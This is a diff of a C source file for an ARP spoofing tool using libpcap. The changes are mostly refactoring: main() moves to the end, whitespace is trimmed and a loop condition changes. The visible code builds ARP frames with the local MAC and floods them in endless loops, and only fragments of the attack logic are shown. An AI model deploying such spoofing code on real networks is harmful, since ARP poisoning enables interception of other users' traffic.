@@ -10,18 +10,6 @@
 #include <unistd.h>
 #include<stdint.h>
 
-int main(int argc, const char* argv[])
-{
-	const char* if_name = argv[1];
-	const char* sender_ip_string = argv[2];
-	const char* target_ip_string = argv[3];
-	char* my_ip_string;
-	char* sender_packet[0x3c];
-	while (true) {
-		Send_ArpRequest(if_name, sender_ip_string, target_ip_string);
-	}
-	return 0;
-}
 
 void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* target_ip_string, const u_char* packet) {
 
@@ -35,7 +23,9 @@ void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* tar
 		fprintf(stderr, "interface name is too long");
 		exit(1);
 	}
-	
+
+
+
 	int fd = socket(AF_INET, SOCK_DGRAM, 0);
 	if (fd == -1) {
 		perror(0);
@@ -50,10 +40,10 @@ void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* tar
 	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
 		fprintf(stderr, "not an Ethernet interface");
 		close(fd);
-		return; 
+		return;
 	}
 
-	unsigned char* my_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data; 
+	unsigned char* my_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
 	struct ether_header header;
 
 	header.ether_type = htons(ETH_P_ARP);
@@ -85,10 +75,12 @@ void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* tar
 		fprintf(stderr, "%s\n", pcap_errbuf);
 	}
 	if (!pcap) {
-		return; 
+		return;
 	}
-	
-	while (true) {
+
+
+
+	while (1) {
 		pcap_sendpacket(pcap, frame, sizeof(frame));
 	}
 	pcap_close(pcap);
@@ -193,3 +185,22 @@ void Send_ArpRequest(const char* if_name, const char* sender_ip_string, const ch
 	pcap_close(pcap);
 }
 
+int main(int argc, const char* argv[])
+{
+
+	const char* if_name = argv[1];
+	const char* sender_ip_string = argv[2];
+	const char* target_ip_string = argv[3];
+	char* my_ip_string;
+	char* sender_packet[0x3c];
+	while (true) {
+		Send_ArpRequest(if_name, sender_ip_string, target_ip_string);
+	}
+
+
+
+
+
+
+	return 0;
+}
